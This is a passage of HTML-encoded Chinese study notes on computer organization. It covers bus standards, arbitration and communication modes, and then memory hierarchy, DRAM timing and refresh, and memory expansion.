64</td><td></td><td>33MHz(&#x72EC;&#x7ACB;)66MHz(&#x72EC;&#x7ACB;)</td><td>132MBps528MBps</td><td>&#x826F;&#x597D;&#x7684;&#x517C;&#x5BB9;&#x6027;&#xFF0C;&#x5373;&#x63D2;&#x5373;&#x7528;&#xFF0C;&#x652F;&#x6301;&#x591A;&#x4E3B;&#x8BBE;&#x5907;&#xFF0C;&#x5177;&#x6709;&#x4E0E;&#x5904;&#x7406;&#x5668;&#x548C;&#x5B58;&#x50A8;&#x5668;&#x5B50;&#x7CFB;&#x7EDF;&#x5B8C;&#x5168;&#x5E76;&#x884C;&#x64CD;&#x4F5C;&#x7684;&#x80FD;&#x529B;&#xFF0C;&#x63D0;&#x4F9B;&#x6570;&#x636E;&#x548C;&#x5730;&#x5740;&#x5947;&#x5076;&#x6821;&#x9A8C;&#xFF0C;&#x53EF;&#x6269;&#x5145;&#xFF0C;&#x8F6F;&#x4EF6;&#x517C;&#x5BB9;&#x6027;&#x597D;&#xFF0C;&#x652F;&#x6301;&#x4E24;&#x79CD;&#x7535;&#x538B;&#x6807;&#x51C6;5V&#x3001;3.3V&#xFF0C;&#x91C7;&#x7528;&#x591A;&#x8DEF;&#x590D;&#x7528;</td></tr><tr><td>AGP</td><td>32</td><td></td><td>66.7MHz(&#x72EC;&#x7ACB;)133MHz(&#x72EC;&#x7ACB;)</td><td>266MBps533MBps</td><td></td></tr><tr><td>RS-232C</td><td>&#x4E32;&#x884C;&#x901A;&#x4FE1;&#x603B;&#x7EBF;&#x6807;&#x51C6;</td><td></td><td>&#x6570;&#x636E;&#x7EC8;&#x7AEF;&#x8BBE;&#x5907;&#xFF08;&#x8BA1;&#x7B97;&#x673A;&#xFF09;&#x548C;&#x6570;&#x636E;&#x901A;&#x4FE1;&#x8BBE;&#x5907;&#xFF08;&#x8C03;&#x5236;&#x89E3;&#x8C03;&#x5668;&#xFF09;&#x4E4B;&#x95F4;&#x7684;&#x6807;&#x51C6;&#x63A5;&#x53E3;</td><td></td><td></td></tr><tr><td>USB</td><td>&#x4E32;&#x884C;&#x63A5;&#x53E3;&#x603B;&#x7EBF;&#x6807;&#x51C6;</td><td></td><td>&#x666E;&#x901A;&#x65E0;&#x5C4F;&#x853D;&#x53CC;&#x7EDE;&#x7EBF;&#x5E26;&#x5C4F;&#x853D;&#x53CC;&#x7EDE;&#x7EBF;&#x6700;&#x9AD8;</td><td>1.5 Mbps(USB1.0)12Mbps(USB1.0)480Mbps(USB2.0)</td><td>&#x5177;&#x6709;&#x771F;&#x6B63;&#x7684;&#x5373;&#x63D2;&#x5373;&#x7528;&#xFF0C;&#x5F88;&#x5F3A;&#x7684;&#x8FDE;&#x63A5;&#x80FD;&#x529B;&#xFF0C;&#x6570;&#x636E;&#x4F20;&#x8F93;&#x7387;&#xFF0C;&#x6807;&#x51C6;&#x7EDF;&#x4E00;</td></tr></tbody></table><p>&#x603B;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x5355;&#x603B;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x53CC;&#x603B;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x4E09;&#x603B;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x4E09;&#x603B;&#x7EBF;&#x7ED3;&#x6784;&#x53C8;&#x4E00;</p><p>&#x56DB;&#x603B;&#x7EBF;&#x7ED3;&#x6784;</p><p>&#x603B;&#x7EBF;&#x5224;&#x4F18;&#x63A7;&#x5236;</p><p>&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8BBE;&#x7F6E;&#x603B;&#x7EBF;&#x5224;&#x4F18;&#x63A7;&#x5236;&#xFF1A;&#x603B;&#x7EBF;&#x4E0A;&#x6240;&#x8FDE;&#x63A5;&#x7684;&#x5404;&#x7C7B;&#x8BBE;&#x5907;&#xFF0C;&#x6309;&#x5176;&#x5BF9;&#x603B;&#x7EBF;&#x6709;&#x65E0;&#x63A7;&#x5236;&#x529F;&#x80FD;&#x5206;&#x4E3A;&#x4E3B;&#x8BBE;&#x5907;(&#x6A21;&#x5757;)&#x548C;&#x4ECE;&#x8BBE;&#x5907;(&#x6A21;&#x5757;)&#x3002;&#x4E3B;&#x8BBE;&#x5907;&#x5BF9;&#x603B;&#x7EBF;&#x6709;&#x63A7;&#x5236;&#x6743;&#xFF0C;&#x4ECE;&#x8BBE;&#x5907;&#x53EA;&#x80FD;&#x54CD;&#x5E94;&#x4ECE;&#x4E3B;&#x8BBE;&#x5907;&#x53D1;&#x6765;&#x7684;&#x603B;&#x7EBF;&#x547D;&#x4EE4;&#xFF0C;&#x5BF9;&#x603B;&#x7EBF;&#x6CA1;&#x6709;&#x63A7;&#x5236;&#x6743;&#x3002;&#x603B;&#x7EBF;&#x4E0A;&#x7684;&#x4FE1;&#x606F;&#x662F;&#x53C8;&#x4E3B;&#x8BBE;&#x5907;&#x542F;&#x52A8;&#x7684;&#xFF0C;&#x82E5;&#x591A;&#x4E2A;&#x4E3B;&#x8BBE;&#x5907;&#x540C;&#x65F6;&#x8981;&#x4F7F;&#x7528;&#x603B;&#x7EBF;&#x65F6;&#xFF0C;&#x5C31;&#x7531;&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x5668;&#x7684;&#x4F18;&#x5224;&#xFF0C;&#x4EF2;&#x88C1;&#x903B;&#x8F91;&#x6309;&#x4E00;&#x5B9A;&#x7684;&#x4F18;&#x5148;&#x7B49;&#x7EA7;&#x987A;&#x5E8F;&#x786E;&#x5B9A;&#x54EA;&#x4E2A;&#x4E3B;&#x8BBE;&#x5907;&#x80FD;&#x4F7F;&#x7528;&#x603B;&#x7EBF;&#x3002;</p><p>&#x603B;&#x7EBF;&#x4F18;&#x5224;&#x63A7;&#x5236;&#x5206;&#x4E3A;&#x96C6;&#x4E2D;&#x5F0F;&#x548C;&#x5206;&#x5E03;&#x5F0F;&#x4E24;&#x79CD;</p><table><thead><tr><th>&#x96C6;&#x4E2D;&#x5F0F;&#x79CD;&#x7C7B;</th><th>&#x7279;&#x70B9;</th></tr></thead><tbody><tr><td>&#x94FE;&#x5F0F;&#x67E5;&#x8BE2;</td><td>&#x8FDE;&#x7EBF;&#x7B80;&#x5355;&#xFF0C;&#x6613;&#x4E8E;&#x6269;&#x5145;&#xFF0C;&#x5BF9;&#x7535;&#x8DEF;&#x6545;&#x969C;&#x6700;&#x654F;&#x611F;</td></tr><tr><td>&#x8BA1;&#x6570;&#x5668;&#x5B9A;&#x65F6;&#x67E5;&#x8BE2;</td><td>&#x4F18;&#x5148;&#x7EA7;&#x8BBE;&#x7F6E;&#x8F83;&#x7075;&#x6D3B;&#xFF0C;&#x5BF9;&#x6545;&#x969C;&#x4E0D;&#x654F;&#x611F;&#xFF0C;&#x8FDE;&#x7EBF;&#x53CA;&#x63A7;&#x5236;&#x8FC7;&#x7A0B;&#x8F83;&#x590D;&#x6742;</td></tr><tr><td>&#x72EC;&#x7ACB;&#x8BF7;&#x6C42;</td><td>&#x54CD;&#x5E94;&#x901F;&#x5EA6;&#x5FEB;&#xFF0C;&#x4F18;&#x5148;&#x7EA7;&#x6B21;&#x5E8F;&#x63A7;&#x5236;&#x7075;&#x6D3B;&#xFF0C;&#x4F46;&#x8FDE;&#x7EBF;&#x591A;&#xFF0C;&#x603B;&#x7EBF;&#x63A7;&#x5236;&#x590D;&#x6742;</td></tr></tbody></table><p>&#x603B;&#x7EBF;&#x901A;&#x4FE1;</p><table><thead><tr><th>&#x901A;&#x4FE1;&#x65B9;&#x5F0F;</th><th>&#x7279;&#x70B9;</th><th>&#x9002;&#x7528;&#x573A;&#x5408;</th></tr></thead><tbody><tr><td>&#x540C;&#x6B65;&#x901A;&#x4FE1;</td><td>&#x6307;&#x7531;&#x7EDF;&#x4E00;&#x65F6;&#x949F;&#x63A7;&#x5236;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x63A7;&#x5236;&#x65B9;&#x5F0F;&#x7B80;&#x5355;&#xFF0C;&#x7075;&#x6D3B;&#x6027;&#x5DEE;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x4E2D;&#x5404;&#x90E8;&#x4EF6;&#x5DE5;&#x4F5C;&#x901F;&#x5EA6;&#x5DEE;&#x5F02;&#x8F83;&#x5927;&#x65F6;&#xFF0C;&#x603B;&#x7EBF;&#x5DE5;&#x4F5C;&#x6548;&#x7387;&#x660E;&#x663E;&#x4E0B;&#x964D;</td><td>&#x4E00;&#x822C;&#x7528;&#x4E8E;&#x603B;&#x7EBF;&#x957F;&#x5EA6;&#x8F83;&#x77ED;&#xFF0C;&#x5404;&#x90E8;&#x4EF6;&#x5B58;&#x53D6;&#x65F6;&#x95F4;&#x6BD4;&#x8F83;&#x4E00;&#x81F4;&#x7684;&#x573A;&#x5408;</td></tr><tr><td>&#x5F02;&#x6B65;&#x901A;&#x4FE1;</td><td>&#x6307;&#x6CA1;&#x6709;&#x7EDF;&#x4E00;&#x65F6;&#x949F;&#x63A7;&#x5236;&#x7684;&#x901A;&#x4FE1;&#xFF0C;&#x90E8;&#x4EF6;&#x91C7;&#x7528;&#x5E94;&#x7B54;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x8054;&#x7CFB;&#xFF0C;&#x63A7;&#x5236;&#x65B9;&#x5F0F;&#x8F83;&#x540C;&#x6B65;&#x590D;&#x6742;&#xFF0C;&#x7075;&#x6D3B;&#x6027;&#x9AD8;&#xFF0C;&#x5F53;&#x7CFB;&#x7EDF;&#x4E2D;&#x5404;&#x90E8;&#x4EF6;&#x5DE5;&#x4F5C;&#x901F;&#x5EA6;&#x5DEE;&#x5F02;&#x8F83;&#x5927;&#x65F6;&#xFF0C;&#x6709;&#x5229;&#x4E8E;&#x63D0;&#x9AD8;&#x603B;&#x7EBF;&#x5DE5;&#x4F5C;&#x6548;&#x7387;</td><td>&#x53C8;&#x5206;&#x4E3A;&#x4E0D;&#x4E92;&#x9501;&#xFF0C;&#x534A;&#x4E92;&#x9501;&#xFF0C;&#x5168;&#x4E92;&#x9501;</td></tr><tr><td>&#x534A;&#x540C;&#x6B65;&#x901A;&#x4FE1;</td><td>&#x65E2;&#x53EF;&#x4EE5;&#x50CF;&#x540C;&#x6B65;&#x901A;&#x4FE1;&#x4E00;&#x6837;&#x7531;&#x7EDF;&#x4E00;&#x65F6;&#x949F;&#x63A7;&#x5236;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x50CF;&#x5F02;&#x6B65;&#x901A;&#x4FE1;&#x4E00;&#x6837;&#x5141;&#x8BB8;&#x4F20;&#x8F93;&#x65F6;&#x95F4;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x5DE5;&#x4F5C;&#x6548;&#x7387;&#x4ECB;&#x4E8E;&#x4E24;&#x8005;&#x4E4B;&#x95F4;</td><td></td></tr><tr><td>&#x5206;&#x79BB;&#x5F0F;&#x901A;&#x4FE1;</td><td>1.&#x5404;&#x6A21;&#x5757;&#x6B32;&#x5360;&#x7528;&#x603B;&#x7EBF;&#x4F7F;&#x7528;&#x6743;&#x5FC5;&#x987B;&#x63D0;&#x51FA;&#x7533;&#x8BF7;2.&#x5728;&#x5F97;&#x5230;&#x603B;&#x7EBF;&#x4F7F;&#x7528;&#x6743;&#x540E;&#xFF0C;&#x4E3B;&#x6A21;&#x5757;&#x5728;&#x9650;&#x5B9A;&#x7684;&#x65F6;&#x95F4;&#x5185;&#x5411;&#x5BF9;&#x65B9;&#x4F20;&#x9001;&#x4FE1;&#x606F;&#xFF0C;&#x91C7;&#x7528;&#x540C;&#x6B65;&#x65B9;&#x5F0F;&#xFF0C;&#x4E0D;&#x518D;&#x7B49;&#x5F85;&#x5BF9;&#x65B9;&#x56DE;&#x7B54;&#x4FE1;&#x53F7;3.&#x5404;&#x6A21;&#x5757;&#x5728;&#x51C6;&#x5907;&#x6570;&#x636E;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x90FD;&#x4E0D;&#x5360;&#x7528;&#x603B;&#x7EBF;&#xFF0C;&#x4F7F;&#x603B;&#x7EBF;&#x53EF;&#x4EE5;&#x63A5;&#x53D7;&#x5176;&#x4ED6;&#x6A21;&#x5757;&#x7684;&#x8BF7;&#x6C42;4.&#x603B;&#x7EBF;&#x88AB;&#x5360;&#x7528;&#x65F6;&#x90FD;&#x5728;&#x505A;&#x6709;&#x6548;&#x5DE5;&#x4F5C;&#xFF0C;&#x6216;&#x8005;&#x901A;&#x8FC7;&#x5B83;&#x53D1;&#x9001;&#x547D;&#x4EE4;&#xFF0C;&#x6216;&#x8005;&#x901A;&#x8FC7;&#x5B83;&#x4F20;&#x9001;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x5B58;&#x5728;&#x7A7A;&#x95F2;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF0C;&#x5145;&#x5206;&#x7684;&#x5229;&#x7528;&#x4E86;&#x603B;&#x7EBF;&#x7684;&#x6709;&#x6548;&#x5360;&#x7528;&#xFF0C;&#x4ECE;&#x800C;&#x5B9E;&#x73B0;&#x4E86;&#x603B;&#x7EBF;&#x5728;&#x591A;&#x4E2A;&#x4E3B;&#xFF0C;&#x4ECE;&#x6A21;&#x5757;&#x95F4;&#x8FDB;&#x884C;&#x4EA4;&#x53C9;&#x91CD;&#x53E0;&#x5E76;&#x884C;&#x4F20;&#x9001;&#x3002;</td><td>&#x5927;&#x578B;&#x8BA1;&#x7B97;&#x673A;&#x7CFB;&#x7EDF;</td></tr></tbody></table><p>&#x540C;&#x6B65;&#x5F0F;&#x6570;&#x636E;&#x8F93;&#x5165;&#x4F20;&#x8F93;</p><p>&#x540C;&#x6B65;&#x5F0F;&#x6570;&#x636E;&#x8F93;&#x51FA;&#x4F20;&#x8F93;</p><p>&#x56DB;  &#x5B58;&#x50A8;&#x5668;</p><p>&#x5B58;&#x50A8;&#x5668;&#x5206;&#x7C7B;</p><p>&#x5B58;&#x50A8;&#x5668;&#x901F;&#x5EA6;&#x5BB9;&#x91CF;&#x548C;&#x4EF7;&#x4F4D;&#x7684;&#x5173;&#x7CFB;</p><p>&#x7F13;&#x5B58;&#x4E3B;&#x5B58;&#x5C42;&#x6B21;&#x548C;&#x4E3B;&#x5B58;&#x8F85;&#x5B58;&#x5C42;&#x6B21;</p><p>&#x7F13;&#x5B58;&#x4E3B;&#x5B58;&#x2013;&#x89E3;&#x51B3;CPU&#x548C;&#x4E3B;&#x5B58;&#x901F;&#x5EA6;&#x4E0D;&#x5339;&#x914D;&#x7684;&#x95EE;&#x9898;</p><p>&#x4E3B;&#x5B58;&#x8F85;&#x5B58;&#x2013;&#x89E3;&#x51B3;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x7684;&#x5BB9;&#x91CF;&#x95EE;&#x9898;</p><p>&#x4E3B;&#x5B58;&#x7684;&#x4E3B;&#x8981;&#x6280;&#x672F;&#x6307;&#x6807;</p><p>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;</p><p>&#x6307;&#x4E3B;&#x5B58;&#x80FD;&#x5B58;&#x653E;&#x4E8C;&#x8FDB;&#x5236;&#x4EE3;&#x7801;&#x7684;&#x603B;&#x4F4D;&#x6570;</p><p>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;=&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2A;&#x6570;*&#x5B58;&#x50A8;&#x5B57;&#x957F;</p><p>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;=&#x5B58;&#x50A8;&#x5355;&#x5143;&#x4E2A;&#x6570;*&#x5B58;&#x50A8;&#x5B57;&#x957F;/8</p><p>&#x5B58;&#x50A8;&#x901F;&#x5EA6;</p><p>&#x7531;&#x5B58;&#x53D6;&#x65F6;&#x95F4;&#x548C;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x6765;&#x8868;&#x793A;&#xFF0C;&#x5B58;&#x53D6;&#x65F6;&#x95F4;&#x6307;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x8BBF;&#x65F6;&#x95F4;&#xFF0C;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x6307;&#x5B58;&#x50A8;&#x5668;&#x8FDB;&#x884C;&#x4E24;&#x6B21;&#x72EC;&#x7ACB;&#x7684;&#x5B58;&#x50A8;&#x5668;&#x64CD;&#x4F5C;&#x6240;&#x9700;&#x7684;&#x6700;&#x5C0F;&#x65F6;&#x95F4;&#x95F4;&#x9694;</p><p>&#x5B58;&#x50A8;&#x5668;&#x5E26;&#x5BBD;</p><p>&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5185;&#x5B58;&#x50A8;&#x5668;&#x5B58;&#x53D6;&#x7684;&#x4FE1;&#x606F;&#x91CF;&#xFF0C;&#x5355;&#x4F4D;&#x53EF;&#x4EE5;&#x7528;&#x5B57;/&#x79D2;&#x6216;&#x5B57;&#x8282;/&#x79D2;&#x6216;&#x4F4D;/&#x79D2;&#x3002;&#x63D0;&#x9AD8;&#x5B58;&#x50A8;&#x5668;&#x5E26;&#x5BBD;&#x53EF;&#x4EE5;1.&#x7F29;&#x77ED;&#x5B58;&#x53D6;&#x5468;&#x671F;2.&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x957F;&#xFF0C;&#x4F7F;&#x6BCF;&#x4E2A;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x53EF;&#x8BFB;/&#x5199;&#x66F4;&#x591A;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x4F4D;&#x6570;</p><p>3.&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x4F53;</p><p>&#x9759;&#x6001;RAM</p><p>&#x52A8;&#x6001;RAM</p><p>&#x52A8;&#x6001;RAM&#x901A;&#x8FC7;&#x7535;&#x5BB9;&#x6765;&#x5B58;&#x50A8;&#x7535;&#x8377;&#x7684;&#x539F;&#x7406;&#x6765;&#x5B58;&#x50A8;&#x4FE1;&#x606F;&#xFF0C;&#x7535;&#x5BB9;&#x4E0A;&#x6709;&#x8DB3;&#x591F;&#x591A;&#x7684;&#x7535;&#x8377;&#x8868;&#x793A;&#x5B58;1&#xFF0C;&#x65E0;&#x7535;&#x8377;&#x8868;&#x793A;&#x5B58;0&#xFF0C;&#x7535;&#x5BB9;&#x4E0A;&#x7535;&#x8377;&#x4E00;&#x822C;&#x53EA;&#x80FD;&#x7EF4;&#x6301;1&#x2014;&#x2014;2ms&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5FC5;&#x987B;&#x5728;2ms&#x5185;&#x5BF9;&#x5176;&#x6240;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x6062;&#x590D;&#x4E00;&#x6B21;&#x539F;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x4E2A;&#x8FC7;&#x7A0B;&#x79F0;&#x4E3A;&#x518D;&#x751F;&#x6216;&#x5237;&#x65B0;&#x3002;</p><p>&#x52A8;&#x6001;RAM&#x65F6;&#x5E8F;&#x56FE;</p><p>&#x5148;&#x7531;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x5C06;&#x884C;&#x5730;&#x5740;&#x9001;&#x5165;&#x884C;&#x5730;&#x5740;&#x7F13;&#x5B58;&#x5668;&#xFF0C;&#x518D;&#x7531;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x5C06;&#x5217;&#x5730;&#x5740;&#x9001;&#x5165;&#x5217;&#x5730;&#x5740;&#x7F13;&#x5B58;&#x5668;&#xFF0C;&#x56E0;&#x6B64;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6EDE;&#x540E;&#x4E8E;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x7684;&#x65F6;&#x95F4;&#x5FC5;&#x987B;&#x8981;&#x8D85;&#x8FC7;&#x5176;&#x89C4;&#x5B9A;&#x503C;</p><p>RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x548C;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6B63;&#x3001;&#x8D1F;&#x7535;&#x5E73;&#x7684;&#x5BBD;&#x5EA6;&#x8981;&#x5927;&#x4E8E;&#x89C4;&#x5B9A;&#x503C;&#xFF0C;&#x4EE5;&#x4FDD;&#x8BC1;&#x82AF;&#x7247;&#x5185;&#x90E8;&#x6B63;&#x5E38;&#x5DE5;&#x4F5C;</p><p>&#x884C;&#x5730;&#x5740;&#x5BF9;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x7684;&#x4E0B;&#x964D;&#x6CBF;&#x4EE5;&#x53CA;&#x5217;&#x5730;&#x5740;&#x5BF9;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x7684;&#x4E0B;&#x964D;&#x6CBF;&#x5E94;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x5730;&#x5740;&#x5EFA;&#x7ACB;&#x65F6;&#x95F4;&#x548C;&#x5730;&#x5740;&#x4FDD;&#x6301;&#x65F6;&#x95F4;&#xFF0C;&#x5DF2;&#x786E;&#x5B9A;&#x884C;&#x3001;&#x5217;&#x5730;&#x5740;&#x5747;&#x80FD;&#x51C6;&#x786E;&#x5199;&#x5165;&#x82AF;&#x7247;&#x3002;</p><p>&#x52A8;&#x6001;RAM&#x8BFB;&#x65F6;&#x5E8F;<br>&#x884C;&#x5730;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x6709;&#x6548;<br>&#x5199;&#x5141;&#x8BB8;WE&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;WE&#xAF;&#x6709;&#x6548;&#xFF08;&#x9AD8;&#xFF09;<br>&#x5217;&#x5730;&#x5740;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6709;&#x6548;<br>&#x6570;&#x636E;DOUTDOUT&#x6709;&#x6548;</p><p>&#x52A8;&#x6001;RAM&#x5199;&#x65F6;&#x5E8F;<br>&#x884C;&#x5730;&#x5740;RAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;RAS&#xAF;&#x6709;&#x6548;<br>&#x5199;&#x5141;&#x8BB8;WE&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;WE&#xAF;&#x6709;&#x6548;&#xFF08;&#x4F4E;&#xFF09;<br>&#x6570;&#x636E;DINDIN&#x6709;<br>&#x5217;&#x5730;&#x5740;CAS&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;&#xAF;CAS&#xAF;&#x6709;&#x6548;</p><p>&#x52A8;&#x6001;RAM&#x5237;&#x65B0;<br>&#x5237;&#x65B0;&#x5B9E;&#x8D28;&#x662F;&#x5C06;&#x539F;&#x4FE1;&#x606F;&#x8BFB;&#x51FA;&#xFF0C;&#x5728;&#x7531;&#x5237;&#x65B0;&#x653E;&#x5927;&#x5668;&#x5F62;&#x6210;&#x539F;&#x4FE1;&#x606F;&#x5E76;&#x91CD;&#x65B0;&#x5199;&#x5165;&#x7684;&#x518D;&#x751F;&#x8FC7;&#x7A0B;</p><p>&#x96C6;&#x4E2D;&#x5237;&#x65B0;&#x2013;&#x5728;&#x89C4;&#x5B9A;&#x7684;&#x4E00;&#x4E2A;&#x5237;&#x65B0;&#x5468;&#x671F;&#x5185;&#xFF0C;&#x5BF9;&#x5168;&#x90E8;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x96C6;&#x4E2D;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x9010;&#x884C;&#x8FDB;&#x884C;&#x5237;&#x65B0;&#xFF0C;&#x6B64;&#x523B;&#x5FC5;&#x987B;&#x505C;&#x6B62;&#x8BFB;/&#x5199;&#x64CD;&#x4F5C;&#x3002;&#x4E4B;&#x540E;&#x5269;&#x4F59;&#x7684;&#x65F6;&#x95F4;&#x8FDB;&#x884C;&#x8BFB;&#x5199;&#x64CD;&#x4F5C;&#x6216;&#x7EF4;&#x6301;&#x4FE1;&#x606F;&#x3002;&#x56E0;&#x6B64;&#x5B58;&#x5728;&#x201C;&#x6B7B;&#x65F6;&#x95F4;&#x201D;&#x6216;&#x8BBF;&#x5B58;&#x201C;&#x6B7B;&#x533A;&#x201D;&#x3002;</p><p>&#x5206;&#x6563;&#x5237;&#x65B0;&#x2013;&#x5BF9;&#x6BCF;&#x884C;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x7684;&#x5237;&#x65B0;&#x5206;&#x6563;&#x5230;&#x6BCF;&#x4E2A;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x5185;&#x5B8C;&#x6210;&#x3002;&#x5176;&#x4E2D;&#x628A;&#x673A;&#x5668;&#x7684;&#x5468;&#x671F;tctc&#x5206;&#x6210;&#x4E24;&#x6BB5;&#xFF0C;&#x524D;&#x534A;&#x6BB5;tMtM&#x7528;&#x6765;&#x8BFB;&#x5199;&#x6216;&#x7EF4;&#x6301;&#x4FE1;&#x606F;&#xFF0C;&#x540E;&#x534A;&#x6BB5;tRtR&#x7528;&#x6765;&#x5237;&#x65B0;,&#x4E0D;&#x5B58;&#x5728;&#x6B7B;&#x65F6;&#x95F4;&#xFF0C;&#x4F46;&#x5B58;&#x53D6;&#x5468;&#x671F;&#x957F;</p><p>&#x5F02;&#x6B65;&#x5237;&#x65B0;&#x2013;&#x5F02;&#x6B65;&#x5237;&#x65B0;&#x4E3A;&#x524D;&#x4E24;&#x79CD;&#x7684;&#x7ED3;&#x5408;&#xFF0C;&#x65E2;&#x53EF;&#x4EE5;&#x7F29;&#x77ED;&#x6B7B;&#x65F6;&#x95F4;&#xFF0C;&#x53C8;&#x53EF;&#x4EE5;&#x5145;&#x5206;&#x5229;&#x7528;2ms&#x7684;&#x7279;&#x70B9;</p><p>&#x52A8;&#x6001;RAM&#x548C;&#x9759;&#x6001;RAM&#x7684;&#x6BD4;&#x8F83;</p><p>&#x5728;&#x540C;&#x6837;&#x5927;&#x5C0F;&#x7684;&#x82AF;&#x7247;&#x4E2D;&#xFF0C;&#x52A8;&#x6001;RAM&#x7684;&#x96C6;&#x6210;&#x5EA6;&#x8FDC;&#x9AD8;&#x4E8E;&#x9759;&#x6001;RAM&#x3002;</p><p>&#x52A8;&#x6001;RAM&#x884C;&#x3001;&#x5217;&#x5730;&#x5740;&#x6309;&#x5148;&#x540E;&#x987A;&#x5E8F;&#x8F93;&#x9001;&#xFF0C;&#x51CF;&#x5C11;&#x4E86;&#x82AF;&#x7247;&#x7684;&#x5F15;&#x811A;&#xFF0C;&#x5C01;&#x88C5;&#x5C3A;&#x5BF8;&#x4E5F;&#x51CF;&#x5C11;</p><p>&#x52A8;&#x6001;RAM&#x7684;&#x529F;&#x8017;&#x6BD4;&#x9759;&#x6001;RAM&#x5C0F;</p><p>&#x52A8;&#x6001;RAM&#x7684;&#x4EF7;&#x683C;&#x6BD4;&#x9759;&#x6001;RAM&#x7684;&#x4EF7;&#x683C;&#x4FBF;&#x5B9C;</p><p>&#x7531;&#x4E8E;&#x4F7F;&#x7528;&#x52A8;&#x6001;&#x5143;&#x4EF6;(&#x7535;&#x5BB9;)&#xFF0C;&#x56E0;&#x6B64;&#x5B83;&#x7684;&#x901F;&#x5EA6;&#x6BD4;&#x9759;&#x6001;RAM&#x4F4E;</p><p>&#x52A8;&#x6001;RAM&#x9700;&#x8981;&#x518D;&#x751F;&#xFF0C;&#x6545;&#x9700;&#x8981;&#x914D;&#x7F6E;&#x518D;&#x751F;&#x7535;&#x8DEF;&#xFF0C;&#x4E5F;&#x9700;&#x8981;&#x6D88;&#x8017;&#x4E00;&#x90E8;&#x5206;&#x529F;&#x7387;&#x3002;&#x901A;&#x5E38;&#xFF0C;&#x5BB9;&#x91CF;&#x4E0D;&#x5927;&#x7684;&#x9AD8;&#x901F;&#x7F13;&#x5B58;&#x5668;&#x5927;&#x591A;&#x7528;&#x9759;&#x6001;RAM&#x5B9E;&#x73B0;</p><p>&#x5B58;&#x50A8;&#x5668;&#x4E0E;CPU&#x7684;&#x8FDE;&#x63A5;</p><p>&#x5B58;&#x50A8;&#x5BB9;&#x91CF;&#x7684;&#x6269;&#x5C55;</p><p>&#x4F4D;&#x6269;&#x5C55;&#x2013;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x957F;</p><p>&#x5B57;&#x6269;&#x5C55;&#x2013;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5668;&#x5B57;&#x7684;&#x6570;&#x91CF;</p><p>&#x5B57;&#x3001;&#x4F4D;&#x6269;&#x5C55;&#x2013;&#x65E2;&#x589E;&#x52A0;&#x5B58;&#x50A8;&#x5B57;&#x7684;&#x6570;&#x91CF;&#xFF0C;&#x53C8;&#x589E;&#x52A0;&#x5B58;&#x50A8;